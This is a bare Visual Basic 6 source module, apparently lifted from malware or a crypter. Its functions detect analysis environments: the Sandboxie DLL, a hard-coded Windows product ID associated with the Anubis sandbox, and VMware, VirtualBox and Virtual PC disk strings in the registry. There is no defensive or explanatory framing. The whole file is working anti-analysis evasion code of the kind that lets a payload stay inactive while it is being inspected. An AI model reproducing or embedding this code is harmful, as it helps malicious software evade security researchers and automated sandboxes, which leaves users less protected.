Attribute VB_Name = "modVM"
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long

Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8

Dim AnubisID As String

Public Function CheckAntis() As Boolean

CheckAntis = False
'Anti Sandboxie
If GetModuleHandle("SbieDll.dll") Then CheckAntis = True
'Anti Anubis
If AntiAnubis = True Then CheckAntis = True
'Anti VMware/Virtual Box/Virtual PC
If IsVirtualPCPresent <> 0 Then CheckAntis = True

End Function

Public Function AntiAnubis() As Boolean
Dim ProductID As String, AnubisProductID As String
AnubisProductID = "76487-640-1457236-23837"

Dim Reg As Object
ProductID = (vbNullString)
Set Reg = CreateObject("WScript.Shell")
ProductID = Reg.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID")

If ProductID = AnubisProductID Then AntiAnubis = True Else AntiAnubis = False
End Function

Public Function IsVirtualPCPresent() As Long
Dim lhKey As Long
Dim sBuffer As String
Dim lLen As Long

If RegOpenKeyEx(&H80000002, "SYSTEM\ControlSet001\Services\Disk\Enum", _
0, &H20019, lhKey) = 0 Then
sBuffer = Space$(255): lLen = 255
If RegQueryValueEx(lhKey, "0", 0, 1, ByVal sBuffer, lLen) = 0 Then
sBuffer = UCase(Left$(sBuffer, lLen - 1))
Select Case True
Case sBuffer Like "*VIRTUAL*": IsVirtualPCPresent = 1
Case sBuffer Like "*VMWARE*": IsVirtualPCPresent = 2
Case sBuffer Like "*VBOX*": IsVirtualPCPresent = 3
End Select
End If
Call RegCloseKey(lhKey)
End If
End Function

